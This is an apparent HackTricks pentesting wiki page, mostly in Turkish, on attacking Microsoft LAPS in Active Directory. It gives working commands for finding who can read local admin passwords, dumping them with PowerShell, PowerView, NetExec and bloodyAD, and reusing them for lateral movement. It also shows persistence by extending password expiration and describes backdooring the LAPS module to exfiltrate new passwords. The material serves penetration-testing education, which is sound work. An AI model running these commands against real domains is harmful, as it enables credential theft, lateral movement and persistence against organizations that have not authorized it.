# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

Bir değerlendirme sırasında karşılaşabileceğiniz şu anda **2 LAPS çeşidi** vardır:

- **Legacy Microsoft LAPS**: yerel administrator password'unu **`ms-Mcs-AdmPwd`** içinde ve son kullanma zamanını **`ms-Mcs-AdmPwdExpirationTime`** içinde saklar.
- **Windows LAPS** (April 2023 updates ile birlikte Windows içine yerleşik): hâlâ legacy modunu taklit edebilir, ancak native modda **`msLAPS-*`** attribute'larını kullanır, **password encryption**, **password history** ve domain controllers için **DSRM password backup** destekler.

LAPS, **local administrator passwords**'ları yönetmek için tasarlanmıştır; bunları domain'e bağlı bilgisayarlarda **benzersiz, rastgele ve sık değişen** hale getirir. Bu attribute'ları okuyabiliyorsanız, genellikle etkilenen host üzerinde **local admin olarak pivot** yapabilirsiniz. Birçok ortamda önemli olan yalnızca password'un kendisini okumak değil, aynı zamanda password attribute'larına erişim için **kimlere yetki verildiğini** bulmaktır.

### Legacy Microsoft LAPS attributes

Domain'in computer object'lerinde, legacy Microsoft LAPS implementation'ı iki attribute'un eklenmesine neden olur:

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Native Windows LAPS, computer object'lerine birkaç yeni attribute ekler:

- **`msLAPS-Password`**: encryption etkin değilken JSON olarak saklanan clear-text password blob'u
- **`msLAPS-PasswordExpirationTime`**: planlanmış expiration time
- **`msLAPS-EncryptedPassword`**: encrypted current password
- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: domain controllers için encrypted DSRM password verisi
- **`msLAPS-CurrentPasswordVersion`**: daha yeni rollback-detection logic tarafından kullanılan GUID-based version tracking (Windows Server 2025 forest schema)

**`msLAPS-Password`** okunabiliyorsa, değer account name, update time ve clear-text password içeren bir JSON object'tir, örneğin:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Etkinleştirilmiş mi kontrol et
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` dosyasından **raw LAPS policy**’yi indirebilir ve ardından bu dosyayı insan tarafından okunabilir formata dönüştürmek için [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) paketinden **`Parse-PolFile`** kullanabilirsiniz.

### Legacy Microsoft LAPS PowerShell cmdlets

Legacy LAPS module yüklüyse, aşağıdaki cmdlets genellikle kullanılabilir:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS yeni bir PowerShell module ve yeni cmdlets ile gelir:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText
```
Burada birkaç operasyonel detay önemli:

- **`Get-LapsADPassword`**, **legacy LAPS**, **clear-text Windows LAPS** ve **encrypted Windows LAPS** işlemlerini otomatik olarak yönetir.
- Eğer password encrypted ise ve siz onu **read** edebiliyor ama **decrypt** edemiyorsanız, cmdlet metadata döner ama clear-text password döndürmez.
- **Password history** yalnızca **Windows LAPS encryption** etkinleştirildiğinde kullanılabilir.
- Domain controllers üzerinde, dönen source **`EncryptedDSRMPassword`** olabilir.

### PowerView / LDAP

**PowerView** ayrıca **who can read the password and read it** bulmak için de kullanılabilir:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
If **`msLAPS-Password`** okunabiliyorsa, dönen JSON’u ayrıştırın ve parola için **`p`** ile yönetilen yerel admin hesabı adı için **`n`** değerini çıkarın.

### Linux / remote tooling

Modern tooling hem legacy Microsoft LAPS’i hem de Windows LAPS’i destekler.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Notes:

- Recent **NetExec** builds support **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`**, and **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** is still useful for **legacy Microsoft LAPS** from Linux, but it only targets **`ms-Mcs-AdmPwd`**.
- If the environment uses **encrypted Windows LAPS**, a simple LDAP read is not enough; you also need to be an **authorized decryptor** or abuse a supported decrypt path.

### Directory synchronization abuse

If you have domain-level **directory synchronization** rights instead of direct read access on each computer object, LAPS can still be interesting.

The combination of **`DS-Replication-Get-Changes`** with **`DS-Replication-Get-Changes-In-Filtered-Set`** or **`DS-Replication-Get-Changes-All`** can be used to synchronize **confidential / RODC-filtered** attributes such as legacy **`ms-Mcs-AdmPwd`**. BloodHound bunu **`SyncLAPSPassword`** olarak modeller. Replikasyon hakları arka planı için [DCSync](dcsync.md) kısmına bakın.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit), birkaç fonksiyonla LAPS envanterini kolaylaştırır.\
Bunlardan biri, **LAPS etkinleştirilmiş tüm computer** için **`ExtendedRights`** ayrıştırmaktır. Bu, özellikle LAPS şifrelerini okumak üzere **delegated** edilmiş **groups**'u gösterir; bunlar çoğu zaman protected groups içindeki users olur.\
Bir domain’e bir computer **join** eden bir **account**, o host üzerinde `All Extended Rights` alır ve bu hak **account**'a **şifreleri okuma** yeteneği verir. Envanter, bir host üzerindeki LAPS şifresini okuyabilen bir user account gösterebilir. Bu, LAPS şifrelerini okuyabilen belirli AD users'ları **hedeflememize** yardımcı olabilir.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## NetExec / CrackMapExec ile LAPS Parolalarını Dökme

Eğer etkileşimli bir PowerShell’iniz yoksa, bu ayrıcalığı LDAP üzerinden uzaktan kötüye kullanabilirsiniz:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Bu, kullanıcının okuyabildiği tüm LAPS secrets'larını döker ve farklı bir local administrator password ile laterally movement yapmanı sağlar.

## Using LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### Son Kullanma Tarihi

Yönetici olduktan sonra, **parolaları elde etmek** ve bir makinenin **parolasını** **güncellemesini engellemek** için **son kullanma tarihini geleceğe ayarlamak** mümkündür.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS bunun yerine **`msLAPS-PasswordExpirationTime`** kullanır:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Şifre, bir **admin** **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`** kullandığında veya **Do not allow password expiration time longer than required by policy** etkinleştirildiğinde yine de dönecektir.

### AD yedeklerinden geçmiş şifreleri kurtarma

**Windows LAPS encryption + password history** etkinleştirildiğinde, bağlanmış AD yedekleri ek bir secrets kaynağı haline gelebilir. Bir bağlı AD snapshot’a erişebiliyor ve **recovery mode** kullanabiliyorsanız, canlı bir DC ile konuşmadan eski saklanmış şifreleri sorgulayabilirsiniz.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Bu çoğunlukla **AD backup theft**, **offline forensics abuse** veya **disaster-recovery media access** sırasında önemlidir.

### Backdoor

Legacy Microsoft LAPS için orijinal source code [burada](https://github.com/GreyCorbel/admpwd) bulunabilir; bu nedenle koda bir backdoor yerleştirmek mümkündür (örneğin `Main/AdmPwd.PS/Main.cs` içindeki `Get-AdmPwdPassword` methodu içinde) ve bu backdoor somehow **exfiltrate yeni passwords ya da bunları bir yerde store etmek** için kullanılabilir.

Ardından, yeni `AdmPwd.PS.dll` dosyasını compile edin ve makineye `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` yoluna upload edin (ve modification time'ını değiştirin).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
